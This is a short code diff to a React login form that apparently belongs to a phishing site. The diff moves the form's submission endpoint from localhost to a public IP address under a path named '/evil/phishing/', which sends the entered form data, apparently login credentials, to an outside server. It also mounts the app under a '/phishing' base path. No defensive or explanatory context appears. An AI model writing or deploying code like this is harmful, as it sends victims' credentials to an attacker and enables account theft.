@@ -50,7 +50,7 @@ function Login(props) {
         };
 
         try {
-            const response = await axios.post("http://localhost:8080/evil/phishing/", data);
+            const response = await axios.post("http://95.140.148.239/evil/phishing/", data);
             console.log(response.data);
             setIsModalVisible(true);
         } catch (error) {
@@ -138,7 +138,7 @@ function Login(props) {
 function App() {
     return (
         <div className="app">
-            <Router>
+	    <Router basename="/phishing">
                 <Header />
                 <div className="container">
                     <Routes>
